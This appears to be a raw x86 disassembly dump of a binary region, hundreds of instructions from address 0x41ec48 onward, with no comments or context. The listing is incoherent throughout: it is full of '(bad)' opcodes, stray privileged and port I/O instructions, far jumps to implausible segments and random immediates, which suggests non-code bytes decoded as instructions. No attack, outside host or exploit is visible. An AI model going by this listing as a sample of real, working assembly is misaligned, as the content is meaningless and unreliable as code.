  41ec48:	lds    edx,FWORD PTR [edx]
  41ec4a:	or     DWORD PTR [edx+0x8],0x66
  41ec4e:	mov    bl,0xcb
  41ec50:	js     0x41ecb7
  41ec52:	pop    eax
  41ec53:	mov    al,ds:0x299b7847
  41ec58:	mov    ebp,0x1cc39f3b
  41ec5d:	hlt    
  41ec5e:	int    0x6c
  41ec60:	scas   eax,DWORD PTR es:[edi]
  41ec61:	ret    0xee99
  41ec64:	mov    ebx,0xf3a3d6c0
  41ec69:	add    eax,0x9888087e
  41ec6e:	and    eax,0xb279b028
  41ec73:	or     cl,BYTE PTR [ecx-0x14010eb8]
  41ec79:	nop
  41ec7a:	call   0xdb6e6501
  41ec7f:	std    
  41ec80:	adc    eax,0x68b6c7ad
  41ec85:	fistp  QWORD PTR [ecx]
  41ec87:	cdq    
  41ec88:	pop    esi
  41ec89:	ret    
  41ec8a:	jg     0x41ec47
  41ec8c:	xchg   ebp,eax
  41ec8d:	sbb    DWORD PTR [esi],ebx
  41ec8f:	xchg   ebp,eax
  41ec90:	add    DWORD PTR [edx],edx
  41ec92:	jns    0x41ec6f
  41ec94:	jb     0x41ec56
  41ec96:	add    edi,esi
  41ec98:	aaa    
  41ec99:	jge    0x41ec3f
  41ec9b:	repz int 0x44
  41ec9e:	push   ebp
  41ec9f:	(bad)  [esi-0x134d878e]
  41eca5:	and    BYTE PTR [edi+esi*2+0x77cc7941],0x4c
  41ecad:	(bad)  
  41ecae:	in     al,0x38
  41ecb0:	mov    eax,ds:0x7ee9487
  41ecb5:	jbe    0x41ec93
  41ecb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ecb8:	fiadd  WORD PTR [esp+edi*2]
  41ecbb:	add    ebx,DWORD PTR [edi]
  41ecbd:	xor    ah,dl
  41ecbf:	jno    0x41ec74
  41ecc1:	hlt    
  41ecc2:	inc    ecx
  41ecc3:	sbb    al,0xac
  41ecc5:	jo     0x41ec64
  41ecc7:	inc    eax
  41ecc8:	pop    edi
  41ecc9:	js     0x41ecbe
  41eccb:	push   edx
  41eccc:	and    BYTE PTR [ebp-0x5def3309],0xd8
  41ecd3:	test   BYTE PTR [edi+eax*4-0x28],0xb6
  41ecd8:	jno    0x41eca2
  41ecda:	out    0x38,eax
  41ecdc:	mov    edi,0xc4f6b134
  41ece1:	mov    DWORD PTR [ecx+edx*1-0xf68e368],ecx
  41ece8:	jne    0x41ecfc
  41ecea:	retf   
  41eceb:	out    dx,al
  41ecec:	or     BYTE PTR [ecx],dl
  41ecee:	out    dx,al
  41ecef:	retf   
  41ecf0:	jnp    0x41ec9d
  41ecf2:	cld    
  41ecf3:	js     0x41ece2
  41ecf5:	jno    0x41ed69
  41ecf7:	xchg   edi,eax
  41ecf8:	pop    ebp
  41ecf9:	ins    DWORD PTR es:[edi],dx
  41ecfa:	dec    edi
  41ecfb:	dec    edx
  41ecfc:	std    
  41ecfd:	into   
  41ecfe:	sub    bh,BYTE PTR [ebx-0x50]
  41ed01:	cwde   
  41ed02:	dec    eax
  41ed03:	or     DWORD PTR ds:0x982e7b19,0xe125d27e
  41ed0d:	push   edx
  41ed0e:	adc    al,0x55
  41ed10:	inc    esp
  41ed11:	add    eax,0xa95e5d03
  41ed16:	test   al,0x87
  41ed18:	jbe    0x41ecc2
  41ed1a:	ins    DWORD PTR es:[edi],dx
  41ed1b:	popf   
  41ed1c:	fst    QWORD PTR [ebp+0x79bc1fd6]
  41ed22:	into   
  41ed23:	aam    0x6e
  41ed25:	jae    0x41ed36
  41ed27:	pop    ds
  41ed28:	dec    eax
  41ed29:	lods   eax,DWORD PTR ds:[esi]
  41ed2a:	idiv   BYTE PTR [ecx]
  41ed2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed2d:	cmc    
  41ed2e:	and    cl,BYTE PTR [ebx+eax*2]
  41ed31:	sbb    eax,0xef5f210
  41ed36:	scas   eax,DWORD PTR es:[edi]
  41ed37:	jle    0x41ed46
  41ed39:	pop    esi
  41ed3a:	cmp    bl,bh
  41ed3c:	add    edi,0x63ce4ead
  41ed42:	data16 jle 0x41ed92
  41ed45:	retf   0x997a
  41ed48:	loope  0x41edad
  41ed4a:	outs   dx,DWORD PTR ds:[esi]
  41ed4b:	icebp  
  41ed4c:	xchg   ecx,eax
  41ed4d:	loop   0x41ed54
  41ed4f:	pop    ebx
  41ed50:	les    esp,FWORD PTR [ebx-0x2f]
  41ed53:	adc    eax,0x3aec296f
  41ed58:	xor    DWORD PTR [ecx],ebx
  41ed5a:	or     bh,bl
  41ed5c:	sti    
  41ed5d:	(bad)  
  41ed5f:	outs   dx,BYTE PTR ds:[esi]
  41ed60:	icebp  
  41ed61:	lahf   
  41ed62:	ins    DWORD PTR es:[edi],dx
  41ed63:	and    eax,0x512bf6c9
  41ed68:	adc    ch,BYTE PTR [edi+0x68ecb792]
  41ed6e:	xchg   esp,eax
  41ed6f:	xchg   edx,eax
  41ed70:	push   0xb4521cdb
  41ed75:	adc    eax,0x2f283359
  41ed7a:	(bad)  
  41ed7c:	test   DWORD PTR [edx-0x5331f150],0xcce2f912
  41ed86:	stc    
  41ed87:	adc    al,0xb2
  41ed89:	mov    ch,0xdb
  41ed8b:	mov    DWORD PTR [edi-0x4d],ebp
  41ed8e:	or     bh,ah
  41ed90:	shl    DWORD PTR fs:[eax],cl
  41ed93:	imul   ebx,DWORD PTR [esi-0x43fc9efb],0xffffffcb
  41ed9a:	pop    edx
  41ed9b:	jns    0x41ee16
  41ed9d:	jecxz  0x41ee18
  41ed9f:	vfnmadd231ps xmm3,xmm6,xmm4
  41eda4:	enter  0xfea,0x4c
  41eda8:	add    esi,0x1ced52e4
  41edae:	outs   dx,BYTE PTR ds:[esi]
  41edaf:	lods   al,BYTE PTR ds:[esi]
  41edb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb1:	repnz ss in al,0xab
  41edb5:	pusha  
  41edb6:	mov    edx,0x76d3420a
  41edbb:	test   DWORD PTR [eax+0x41],ebp
  41edbe:	ret    0x2556
  41edc1:	jmp    0x8adaf5da
  41edc6:	fs dec ecx
  41edc8:	jnp    0x41ed5a
  41edca:	jmp    0x4d34d227
  41edcf:	pop    ecx
  41edd0:	in     al,0xc3
  41edd2:	or     ebx,DWORD PTR [edx-0x589371c7]
  41edd8:	pop    ebx
  41edd9:	fdivr  QWORD PTR [esi+0x7]
  41eddc:	enter  0x83d,0xa4
  41ede0:	ficom  DWORD PTR [eax+0x25990766]
  41ede6:	fistp  WORD PTR [edi-0x72dad223]
  41edec:	xchg   ebp,eax
  41eded:	lods   eax,DWORD PTR ds:[esi]
  41edee:	add    esi,DWORD PTR ss:[edi*8-0x35ecdf5b]
  41edf6:	in     al,0x6e
  41edf8:	and    ah,BYTE PTR [edi+0x25]
  41edfb:	jb     0x41ee1c
  41edfd:	adc    eax,0x25246437
  41ee02:	mov    al,0xdb
  41ee04:	mov    esi,0x181f2386
  41ee09:	mov    al,0xc0
  41ee0b:	popa   
  41ee0c:	xchg   BYTE PTR ss:[edi],dh
  41ee0f:	jns    0x41ee73
  41ee11:	lea    edx,[ecx-0x4b]
  41ee14:	pmaxsw mm2,QWORD PTR [ecx+esi*4+0x50d6ae58]
  41ee1c:	dec    ecx
  41ee1d:	add    eax,0x59c282d8
  41ee22:	call   0xb8bdd768
  41ee27:	adc    DWORD PTR [ebx],esp
  41ee29:	push   ebx
  41ee2a:	mov    esp,0x93d26a9e
  41ee2f:	ss (bad) 
  41ee31:	in     eax,0xc3
  41ee33:	pop    es
  41ee34:	cmp    ecx,DWORD PTR [ecx+0x2a]
  41ee37:	mov    ch,0xeb
  41ee39:	dec    ebx
  41ee3a:	into   
  41ee3b:	adc    al,bl
  41ee3d:	ret    0x681e
  41ee40:	push   ss
  41ee41:	jge    0x41ee21
  41ee43:	mov    dh,BYTE PTR [ebx+edi*1-0x7d]
  41ee47:	xchg   edi,eax
  41ee48:	inc    ecx
  41ee49:	add    esp,DWORD PTR [edi]
  41ee4b:	test   al,0x86
  41ee4d:	mov    ds:0x70f6937b,al
  41ee52:	stos   DWORD PTR es:[edi],eax
  41ee53:	add    eax,0x34442182
  41ee58:	push   es
  41ee59:	mov    ch,0x4d
  41ee5b:	mov    ch,0x44
  41ee5d:	daa    
  41ee5e:	inc    ebx
  41ee5f:	out    dx,eax
  41ee60:	mov    eax,ds:0x3fd33d97
  41ee65:	mov    cl,0xe
  41ee67:	adc    eax,0x72942185
  41ee6c:	pop    esi
  41ee6d:	or     DWORD PTR ds:0xf63825e6,0x52d5883c
  41ee77:	sbb    al,0x2e
  41ee79:	fld    QWORD PTR [ebp+0x2ac2478d]
  41ee7f:	aaa    
  41ee80:	das    
  41ee81:	das    
  41ee82:	xchg   edi,eax
  41ee83:	imul   esp,DWORD PTR [ecx+edi*4],0x62d446c
  41ee8a:	mov    cs,WORD PTR [edi+eiz*2]
  41ee8d:	iret   
  41ee8e:	push   edx
  41ee8f:	xlat   BYTE PTR ds:[ebx]
  41ee90:	es mov al,0xeb
  41ee93:	add    BYTE PTR [esi+eax*8-0x14],ch
  41ee97:	mov    eax,0x681879fa
  41ee9c:	pop    DWORD PTR [ebp-0x1c]
  41ee9f:	dec    edi
  41eea0:	rcr    BYTE PTR [ecx+0x45c2a6ee],0x3f
  41eea7:	out    dx,eax
  41eea8:	mov    ebp,0x5bdbac84
  41eead:	inc    eax
  41eeae:	sbb    eax,0xbd8397a8
  41eeb3:	das    
  41eeb4:	aam    0x44
  41eeb6:	jge    0x41ee60
  41eeb8:	inc    ecx
  41eeb9:	mov    edx,0xf9560d67
  41eebe:	(bad)  
  41eec0:	inc    eax
  41eec1:	js     0x41ee51
  41eec3:	(bad)  
  41eec4:	fwait
  41eec5:	adc    dl,BYTE PTR [esi+0x73adb274]
  41eecb:	pusha  
  41eecc:	jmp    0x41ef38
  41eece:	cmp    DWORD PTR [edx],esp
  41eed0:	ret    
  41eed1:	push   edi
  41eed2:	aam    0x93
  41eed4:	inc    ebp
  41eed5:	xchg   ecx,eax
  41eed6:	mov    ds:0xfb1c7b3c,al
  41eedb:	icebp  
  41eedc:	outs   dx,DWORD PTR ds:[esi]
  41eedd:	jecxz  0x41ef03
  41eedf:	daa    
  41eee0:	gs cmp al,0x13
  41eee3:	xchg   edi,eax
  41eee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eee5:	fmul   DWORD PTR [ecx-0x39]
  41eee8:	push   eax
  41eee9:	push   esi
  41eeea:	sub    al,0x12
  41eeec:	(bad)  
  41eeed:	xor    edi,DWORD PTR [ebx-0x425c7616]
  41eef3:	sar    BYTE PTR [eax+0x5b729468],1
  41eef9:	push   edi
  41eefa:	xor    ebx,eax
  41eefc:	fst    QWORD PTR ss:[ebx-0x21a4f698]
  41ef03:	sub    DWORD PTR [eax],esp
  41ef05:	sub    ecx,esi
  41ef07:	ret    0x58b2
  41ef0a:	icebp  
  41ef0b:	aad    0x95
  41ef0d:	aad    0xf7
  41ef0f:	and    DWORD PTR [edx+0x45271901],esp
  41ef15:	pop    ss
  41ef16:	push   ebx
  41ef17:	inc    ecx
  41ef18:	fcmovb st,st(6)
  41ef1a:	lods   eax,DWORD PTR ds:[esi]
  41ef1b:	fcomi  st,st(2)
  41ef1d:	xchg   ebp,eax
  41ef1e:	div    BYTE PTR [ebx+edi*8-0x64f46653]
  41ef25:	fwait
  41ef26:	(bad)  
  41ef27:	loop   0x41ef9b
  41ef29:	pop    esi
  41ef2a:	mov    edi,0x21236adb
  41ef2f:	add    al,0x5e
  41ef31:	xchg   ebp,eax
  41ef32:	sub    eax,0xfa6c8d47
  41ef37:	sbb    dl,BYTE PTR [ecx]
  41ef39:	push   ebx
  41ef3a:	cld    
  41ef3b:	dec    edi
  41ef3c:	ds or  al,0x3e
  41ef3f:	inc    esp
  41ef40:	push   ss
  41ef41:	test   al,ch
  41ef43:	nop
  41ef44:	mov    al,ds:0x6025b428
  41ef49:	lds    ebp,FWORD PTR ds:0xbae06fdd
  41ef4f:	add    ebp,ebp
  41ef51:	cli    
  41ef52:	test   al,0xb3
  41ef54:	data16 clc 
  41ef56:	int    0xb1
  41ef58:	loopne 0x41ef06
  41ef5a:	or     eax,DWORD PTR [edi]
  41ef5c:	pushf  
  41ef5d:	int    0x84
  41ef5f:	mov    DWORD PTR [eax+0x554e418b],ebp
  41ef65:	or     al,0xfd
  41ef67:	cli    
  41ef68:	push   ds
  41ef69:	push   esp
  41ef6a:	jle    0x41ef0d
  41ef6c:	sbb    al,0x78
  41ef6e:	jmp    0x1dc1:0x7e7f0fe2
  41ef75:	dec    edi
  41ef76:	and    DWORD PTR [edi],ebx
  41ef78:	push   ebx
  41ef79:	test   DWORD PTR [edi+0x55],ebx
  41ef7c:	and    esp,DWORD PTR [ebx]
  41ef7e:	cmp    eax,0x1c09039b
  41ef83:	adc    eax,0xe2caa9c8
  41ef88:	and    dh,BYTE PTR [ebp-0x3779f89e]
  41ef8e:	and    edi,0x1667c955
  41ef94:	dec    edi
  41ef95:	xchg   ebx,eax
  41ef96:	outs   dx,DWORD PTR ds:[esi]
  41ef97:	aas    
  41ef98:	stos   DWORD PTR es:[edi],eax
  41ef99:	cmc    
  41ef9a:	push   ecx
  41ef9b:	mov    eax,ds:0x55130f69
  41efa0:	jb     0x41efa9
  41efa2:	or     al,0xcb
  41efa5:	vpsraw ymm5,ymm2,XMMWORD PTR [ebx]
  41efa9:	stos   BYTE PTR es:[edi],al
  41efaa:	(bad)  
  41efab:	cmp    al,0x5a
  41efad:	cmp    DWORD PTR [ecx+0x1dd2bde],ecx
  41efb3:	daa    
  41efb4:	retf   
  41efb5:	in     eax,0x93
  41efb7:	ins    BYTE PTR es:[edi],dx
  41efb8:	push   ecx
  41efb9:	jne    0x41efa0
  41efbb:	int3   
  41efbc:	add    eax,DWORD PTR [eax+0x23]
  41efbf:	ret    0x6b5f
  41efc2:	sub    eax,0x5697e36d
  41efc7:	repz in eax,0x3f
  41efca:	push   esp
  41efcb:	push   cs
  41efcc:	jg     0x41f030
  41efce:	and    ecx,DWORD PTR ds:0x4c298fbc
  41efd4:	inc    ecx
  41efd5:	sub    DWORD PTR [esi+0x79],esi
  41efd8:	retf   0x4ca7
  41efdb:	icebp  
  41efdc:	mul    BYTE PTR [edi-0x7d]
  41efdf:	cld    
  41efe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efe1:	fiadd  DWORD PTR [ebp+edi*8-0x3e]
  41efe5:	je     0x41f05b
  41efe7:	pop    es
  41efe8:	xor    ebp,ecx
  41efea:	adc    al,0xf
  41efec:	pop    edi
  41efed:	or     BYTE PTR [ecx+0x13e99953],dl
  41eff3:	dec    ecx
  41eff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eff5:	mov    ds:0xd768022c,eax
  41effa:	jno    0x41f046
  41effc:	ficom  DWORD PTR [esi+0x198da771]
  41f002:	jae    0x41efc4
  41f004:	in     al,0xe8
  41f006:	dec    ecx
  41f007:	out    0xa3,eax
  41f009:	imul   esp,DWORD PTR [esi-0x56930127],0x30
  41f010:	add    ebx,DWORD PTR [ebp+0x671cc108]
  41f016:	mov    bh,0x66
  41f018:	jbe    0x41efc2
  41f01a:	das    
  41f01b:	rol    DWORD PTR [ebx],cl
  41f01d:	mov    ebx,0x7ac4d04c
  41f022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f023:	les    eax,FWORD PTR [esi-0x1c]
  41f026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f027:	aam    0xca
  41f029:	and    eax,0x8461c870
  41f02e:	repnz fdivr DWORD PTR [eax-0x10]
  41f032:	cld    
  41f033:	sti    
  41f034:	int3   
  41f035:	lea    ebx,[edi]
  41f037:	fld    TBYTE PTR ds:0x32889ed9
  41f03d:	addr16 push ecx
  41f03f:	pushaw 
  41f041:	pop    ebx
  41f042:	out    dx,eax
  41f043:	pop    edi
  41f044:	dec    esi
  41f045:	popf   
  41f046:	mov    ds:0xd07807c4,eax
  41f04b:	iret   
  41f04c:	fsub   QWORD PTR [ebp+ecx*2+0x6d]
  41f050:	or     DWORD PTR [eax-0x6a],0x50db5885
  41f057:	ret    0x143
  41f05a:	and    BYTE PTR [edx-0x2e031e5d],dh
  41f060:	add    DWORD PTR [ebx+0x7e55f65a],ebx
  41f066:	arpl   WORD PTR [eax-0x71],si
  41f069:	fist   DWORD PTR [edi+0x70]
  41f06c:	push   ds
  41f06d:	int3   
  41f06e:	jg     0x41f097
  41f070:	dec    ecx
  41f071:	retf   0x554b
  41f074:	jge    0x41f0c7
  41f076:	xchg   esp,eax
  41f077:	push   esp
  41f078:	ja     0x41f020
  41f07a:	gs out 0xd9,eax
  41f07d:	(bad)  
  41f07e:	cmp    edi,ecx
  41f080:	bound  ebp,QWORD PTR [eax+0x54e9cccc]
  41f086:	loopne 0x41f0ac
  41f088:	rcr    DWORD PTR [esi-0x41792258],cl
  41f08e:	test   DWORD PTR [ecx-0x3fa95146],esp
  41f094:	jo     0x41f0ca
  41f096:	push   ecx
  41f097:	test   DWORD PTR [ecx+0x581a8b9d],esi
  41f09d:	in     eax,dx
  41f09e:	outs   dx,DWORD PTR ds:[esi]
  41f09f:	mov    ch,0xe2
  41f0a1:	into   
  41f0a2:	cmp    eax,0xe07274dd
  41f0a7:	sbb    ebx,DWORD PTR [eax]
  41f0a9:	cmp    BYTE PTR [edx],0xe6
  41f0ac:	mov    ?,WORD PTR [ebx]
  41f0ae:	stos   DWORD PTR es:[edi],eax
  41f0af:	cs pop ebx
  41f0b1:	mov    al,BYTE PTR [esi-0x1f]
  41f0b4:	(bad)  
  41f0b6:	dec    ebp
  41f0b7:	xor    al,0x43
  41f0b9:	outs   dx,BYTE PTR ds:[esi]
  41f0ba:	out    0x27,al
  41f0bc:	fstp   QWORD PTR [ebp+0x29]
  41f0bf:	es test eax,0xffc179bc
  41f0c5:	mov    cl,BYTE PTR [ecx+0x6e333993]
  41f0cb:	adc    BYTE PTR [ebx-0x14],ch
  41f0ce:	shl    BYTE PTR [ebp-0x4552c432],cl
  41f0d4:	std    
  41f0d5:	in     al,0xe7
  41f0d7:	rcr    DWORD PTR [ebp-0x558c714],cl
  41f0dd:	adc    DWORD PTR [ebp-0x24],ecx
  41f0e0:	cli    
  41f0e1:	mov    dh,0xff
  41f0e3:	xchg   ebp,eax
  41f0e4:	mov    eax,ds:0x725e2d47
  41f0e9:	push   esp
  41f0ea:	push   ss
  41f0eb:	lahf   
  41f0ec:	ja     0x41f098
  41f0ee:	add    edi,DWORD PTR [ebp-0x5e]
  41f0f1:	mov    esp,0x75b450a4
  41f0f6:	inc    edi
  41f0f7:	push   ss
  41f0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0f9:	stc    
  41f0fa:	inc    bh
  41f0fc:	and    ah,BYTE PTR [ebx-0x6f]
  41f0ff:	retf   
  41f100:	mov    ch,0x66
  41f102:	loope  0x41f10a
  41f104:	je     0x41f0aa
  41f106:	add    BYTE PTR [eax],bl
  41f108:	jmp    0x41f0a5
  41f10a:	add    ebx,DWORD PTR [edx]
  41f10c:	aam    0xcb
  41f10e:	jb     0x41f15d
  41f110:	ret    0xb373
  41f113:	cmc    
  41f114:	addr16 addr16 shl bl,1
  41f118:	sub    BYTE PTR [esi+0x54],al
  41f11b:	icebp  
  41f11c:	mov    al,ds:0xa55eb69d
  41f121:	sub    eax,0x773df65c
  41f126:	hlt    
  41f127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f128:	or     ecx,DWORD PTR [ecx-0x1a]
  41f12b:	lds    edx,FWORD PTR [edi-0x5a]
  41f12e:	leave  
  41f12f:	sbb    eax,0xf971bc1e
  41f134:	xchg   edx,eax
  41f135:	xchg   ebp,eax
  41f136:	not    dh
  41f138:	and    eax,0xb8f52327
  41f13d:	(bad)  
  41f13e:	(bad)  
  41f13f:	inc    ebp
  41f140:	mov    dl,0x2c
  41f142:	scas   eax,DWORD PTR es:[edi]
  41f143:	fs cmp eax,0xaa29a5de
  41f149:	jno    0x41f1a3
  41f14b:	popf   
  41f14c:	jl     0x41f13e
  41f14e:	lds    esi,FWORD PTR [esi+0x13f432ba]
  41f154:	xor    edi,ebp
  41f156:	add    al,0xff
  41f158:	aam    0xe7
  41f15a:	ficom  DWORD PTR [eax-0x6c]
  41f15d:	mov    esp,0xb0316edc
  41f162:	adc    ah,cl
  41f164:	cmp    bl,BYTE PTR [ebx+0x1b42d453]
  41f16a:	lock sar BYTE PTR [edi+0x5abf4673],1
  41f171:	jae    0x41f12b
  41f173:	scas   al,BYTE PTR es:[edi]
  41f174:	into   
  41f175:	mov    esp,0x28683bd1
  41f17a:	mov    ds:0x841b19d,al
  41f17f:	inc    ebx
  41f180:	xchg   ecx,eax
  41f181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f182:	xor    cl,BYTE PTR [edx+edx*4]
  41f185:	jg     0x41f122
  41f187:	dec    esp
  41f188:	(bad)  
  41f18a:	mov    edi,0xff4576f0
  41f18f:	inc    ebx
  41f190:	popa   
  41f191:	push   0x2ddb1ac5
  41f196:	sbb    al,0x92
  41f198:	rcl    esp,cl
  41f19a:	test   DWORD PTR [edi-0x17],edx
  41f19d:	std    
  41f19e:	push   edi
  41f19f:	add    esi,esi
  41f1a1:	(bad)  
  41f1a2:	call   0xc70e1ce0
  41f1a7:	push   es
  41f1a8:	inc    ecx
  41f1a9:	fdiv   DWORD PTR [edx-0x4f]
  41f1ac:	jmp    0x41f17d
  41f1ae:	mov    al,ds:0x2ce4b7d8
  41f1b3:	push   edi
  41f1b4:	sbb    cl,BYTE PTR [edx-0x4dae1623]
  41f1ba:	cmc    
  41f1bb:	cs aas 
  41f1bd:	js     0x41f1a9
  41f1bf:	adc    al,0xbe
  41f1c1:	sub    eax,0xe0a610ad
  41f1c6:	(bad)  
  41f1c7:	or     eax,0x26721aca
  41f1cc:	ja     0x21602f7
  41f1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1d3:	pushf  
  41f1d4:	ins    DWORD PTR es:[edi],dx
  41f1d5:	jae    0x41f1ee
  41f1d7:	push   0xfffffffc
  41f1d9:	cmp    bh,BYTE PTR [eax-0xa]
  41f1dc:	and    eax,0x69d01f2e
  41f1e1:	aad    0x7b
  41f1e3:	lds    esp,FWORD PTR [ecx-0x18d0e1b2]
  41f1e9:	lahf   
  41f1ea:	or     ch,BYTE PTR [ebp-0x19]
  41f1ed:	jg     0x41f172
  41f1ef:	and    dl,bh
  41f1f1:	cwde   
  41f1f2:	dec    esp
  41f1f3:	aam    0x53
  41f1f5:	in     eax,0xd4
  41f1f7:	xor    ecx,edx
  41f1f9:	xor    cl,BYTE PTR [ecx+eiz*8-0x2b118d0f]
  41f200:	pop    edi
  41f201:	test   DWORD PTR ds:0x29d87130,ecx
  41f207:	jg     0x41f1f6
  41f209:	add    ebx,DWORD PTR [esi-0x5e]
  41f20c:	rcr    BYTE PTR [ecx+edi*1-0x4c16228],1
  41f213:	mov    al,0xdc
  41f215:	mov    ebx,0x69ef9f81
  41f21a:	mov    eax,0xe98df966
  41f21f:	dec    esp
  41f220:	jne    0x41f256
  41f222:	jg     0x41f21a
  41f224:	test   DWORD PTR [ebx+ebx*8+0x7e],eax
  41f228:	mov    eax,0xfe865d55
  41f22d:	inc    ebp
  41f22e:	push   eax
  41f22f:	aam    0x22
  41f231:	inc    esi
  41f232:	inc    edx
  41f233:	cdq    
  41f234:	mov    dl,0xa5
  41f236:	adc    ecx,esi
  41f238:	sbb    al,0x25
  41f23a:	or     bl,BYTE PTR [ebx+0x1f]
  41f23d:	xchg   esi,eax
  41f23e:	push   edx
  41f23f:	mov    dl,bh
  41f241:	sbb    ebp,DWORD PTR [ecx+0x6f875df5]
  41f247:	xchg   BYTE PTR [edi+edx*1+0x5037a9fb],bh
  41f24e:	sbb    bl,BYTE PTR [edx+0x13]
  41f251:	je     0x41f230
  41f253:	jmp    0x41f202
  41f255:	dec    esp
  41f256:	out    dx,al
  41f257:	dec    edi
  41f258:	mov    gs,WORD PTR [edi+0x2f769c2a]
  41f25e:	xor    al,BYTE PTR [esi-0x6dcc1364]
  41f264:	jmp    0xaa8dee19
  41f269:	test   DWORD PTR [ecx-0x75],0x95d4945f
  41f270:	add    DWORD PTR [ebp-0x1f],eax
  41f273:	dec    edx
  41f274:	lahf   
  41f275:	mov    ch,0x7d
  41f277:	ins    DWORD PTR es:[edi],dx
  41f278:	dec    esp
  41f279:	jmp    0x274581db
  41f27e:	test   BYTE PTR [edx],dh
  41f280:	push   0xffffffa1
  41f282:	mov    ebp,0x56d9cbeb
  41f287:	cmp    al,0x5d
  41f289:	push   esp
  41f28a:	pop    DWORD PTR [eax]
  41f28c:	leave  
  41f28d:	pop    edx
  41f28e:	inc    ebx
  41f28f:	arpl   di,bp
  41f291:	jo     0x41f274
  41f293:	jl     0x41f2d3
  41f295:	(bad)  
  41f296:	jns    0x41f2a6
  41f298:	sbb    DWORD PTR [ebx+0x6ef46b57],0x7c
  41f29f:	dec    ebp
  41f2a0:	sub    BYTE PTR [ebx+ecx*1],bh
  41f2a3:	jnp    0x41f2ca
  41f2a5:	or     al,0xc7
  41f2a7:	aam    0xb2
  41f2a9:	daa    
  41f2aa:	into   
  41f2ab:	and    al,BYTE PTR [esi*4+0x1ab274e5]
  41f2b2:	or     eax,0x6bc82e08
  41f2b7:	cmp    al,0x50
  41f2b9:	jecxz  0x41f253
  41f2bb:	xor    DWORD PTR [ecx],0xffffffcf
  41f2be:	xchg   ecx,eax
  41f2bf:	pop    ebp
  41f2c0:	sub    DWORD PTR [ebx],eax
  41f2c2:	enter  0x4f36,0xae
  41f2c6:	pop    edi
  41f2c7:	ficom  DWORD PTR [esi+0x2e]
  41f2ca:	push   eax
  41f2cb:	std    
  41f2cc:	sbb    esp,DWORD PTR [edi+ebp*8-0x159315e6]
  41f2d3:	shl    BYTE PTR [edx+0x77],0x48
  41f2d7:	addr16 jb 0x41f28b
  41f2da:	call   0xce9:0x204cc923
  41f2e1:	fwait
  41f2e2:	push   0xd3b38bec
  41f2e7:	bound  edi,QWORD PTR [edi-0x22e3ba8f]
  41f2ed:	inc    esi
  41f2ee:	mov    bl,0x9b
  41f2f0:	cmp    cl,al
  41f2f2:	test   BYTE PTR [ebx+eiz*8+0x7a374037],0x18
  41f2fa:	in     al,0xff
  41f2fc:	mov    cl,0x3e
  41f2fe:	xor    al,0x7d
  41f300:	gs push ebx
  41f302:	adc    eax,0x5362811c
  41f308:	retf   
  41f309:	test   ah,cl
  41f30b:	pop    ebp
  41f30c:	stos   DWORD PTR es:[edi],eax
  41f30d:	idiv   BYTE PTR [ebp+0x62cb5cc8]
  41f313:	into   
  41f314:	push   esi
  41f315:	sbb    eax,0x715311b0
  41f31a:	mov    BYTE PTR [edi-0x54],bl
  41f31d:	add    DWORD PTR [eax-0x6b],esp
  41f320:	or     BYTE PTR [ecx-0x1],dh
  41f323:	sbb    al,0xdd
  41f325:	mov    gs,ecx
  41f327:	stos   BYTE PTR es:[edi],al
  41f328:	hlt    
  41f329:	(bad)  ds:0x62eab4ee
  41f32f:	stos   BYTE PTR es:[edi],al
  41f330:	shr    BYTE PTR [edi],0x4f
  41f333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f334:	or     DWORD PTR [edx-0x24a37792],eax
  41f33a:	push   ds
  41f33b:	cs popa 
  41f33d:	sbb    cl,bh
  41f33f:	(bad)  
  41f340:	adc    ebx,eax
  41f342:	cmp    al,0x40
  41f344:	add    ecx,esp
  41f346:	or     BYTE PTR [ebx],0x80
  41f349:	outs   dx,DWORD PTR ds:[esi]
  41f34a:	pushf  
  41f34b:	aas    
  41f34c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f34e:	mov    ebp,0xd4ad221d
  41f353:	pushf  
  41f354:	fcomi  st,st(5)
  41f356:	dec    esi
  41f357:	jae    0x41f2f1
  41f359:	dec    ecx
  41f35a:	bnd lock ret 
  41f35d:	cmc    
  41f35e:	jmp    0xfd52:0x39e3e87b
  41f365:	add    eax,0x99e623e7
  41f36a:	mov    edi,DWORD PTR [edx+0x56f5b24c]
  41f370:	dec    esi
  41f371:	ins    DWORD PTR es:[edi],dx
  41f372:	or     BYTE PTR [ecx],al
  41f374:	loope  0x41f311
  41f376:	push   esi
  41f377:	push   ss
  41f378:	je     0x41f387
  41f37a:	push   ds
  41f37b:	retf   
  41f37c:	and    bh,ah
  41f37e:	jno    0x41f3bf
  41f380:	push   eax
  41f381:	adc    BYTE PTR [esi],al
  41f383:	data16 not BYTE PTR [eax+0x42]
  41f387:	sub    ah,bh
  41f389:	xchg   ebx,eax
  41f38a:	xchg   edx,eax
  41f38b:	jns    0x41f3f1
  41f38d:	nop
  41f38e:	cmp    ebx,esp
  41f390:	outs   dx,DWORD PTR ds:[esi]
  41f391:	sub    DWORD PTR [esi+0x68237ec9],ecx
  41f397:	jmp    0x41f406
  41f399:	xor    al,0x78
  41f39b:	cli    
  41f39c:	into   
  41f39d:	(bad)  
  41f39e:	jns    0x41f348
  41f3a0:	rol    BYTE PTR [ebp-0x63315cf5],cl
  41f3a6:	dec    esi
  41f3a7:	sbb    BYTE PTR [eax],cl
  41f3a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3aa:	daa    
  41f3ab:	fisub  DWORD PTR [ebx-0xc1af71e]
  41f3b1:	push   ss
  41f3b2:	cs out 0xbc,eax
  41f3b5:	ins    DWORD PTR es:[edi],dx
  41f3b6:	rcr    BYTE PTR [eax+0x34c7fefe],cl
  41f3bc:	fnsave [edx]
